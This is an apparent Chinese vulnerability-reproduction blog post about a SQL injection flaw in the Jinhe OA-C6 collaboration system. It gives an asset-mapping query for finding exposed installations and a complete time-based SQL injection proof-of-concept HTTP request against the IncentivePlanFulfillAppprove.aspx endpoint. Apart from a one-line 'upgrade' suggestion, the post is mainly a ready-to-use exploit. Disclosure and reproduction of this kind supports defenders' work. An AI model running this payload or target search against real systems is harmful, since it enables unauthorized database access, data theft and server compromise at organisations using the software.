#  金和OA-C6系统SQL注入漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-03-23 02:13  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
#   
  
01  
  
—  
  
漏洞名称  
# 金和OA-C6系统SQL注入漏洞  
#   
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS0VRHEKpJeVngDj3INGYvtCnaRHaJNXibUicJMy5hDIia26p8wEXeGs7GsAcgxniaL3wTGdqzRMXrxwYXA0Jia3SySiaDicsyg3o1Nec0/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
金和O  
A-C6系统  
是一款  
面向大中型企  
业及集团化组织的协同运营管理平  
台，其特点包括功能强大、使用便捷、安装维护简单  
、安全可靠、性能稳定，并提供科学的服务体系。该系统旨在帮助企业  
规范管理流程  
、提升办公效率、降低运营成本，实现战略目标的有效落地。  
金和OA-C6系统  
存在  
sql注入漏洞  
，攻击者可通过构造恶意SQL语句操控数据库，可能导致敏感信息泄露、数据篡改甚至服务器权限被获取。  
  
04  
  
—  
  
资产测绘  
```
app="金和网络-金和OA"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1eDiaxLfpjXyJ2Jic9WF3XpiaKajcnibvvwBw3hgRBK0eUOIArWgocFklCiaXukUcfpPm94cY5NkDhew4xlqrJGL0XbadsmDYJR5DI/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfillAppprove.aspx/?httpOID=1;WAITFOR+DELAY+%270:0:1%27-- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=jw4gn0cjk2ufvecm45kn1u4x
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0qWG907jib7BsrTGicNvjiaoJ8ibrnOibTu5x3CHqUibddIjwv6CDRXItdrELwrf5VjKJ5v8HdxepDe7If8HQ00xXODbqPLgg3u4r24/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS3noJNR718ibJJAyYtaJFQlpib3sNWzn4JA7fWv7C3m0CpfE2PJmoFpWLjNwRZprSNRwepVPnNIcT5Ziag5TuspzDRl9icfrPFxJ30/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS3CKJ7OZUqibN0Dlc7HFFdKftiaLGSdNHcCztnBcaRCnJ5xWuk0KmyCdF8ROUNX8XvJIX0aXZAsaeSPVFg6Fmzg8E2XDczogACIs/640?wx_fmt=png&from=appmsg "")  
  
06  
  
—  
  
修复建议  
  
升级至最新安全版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  
  
  
  
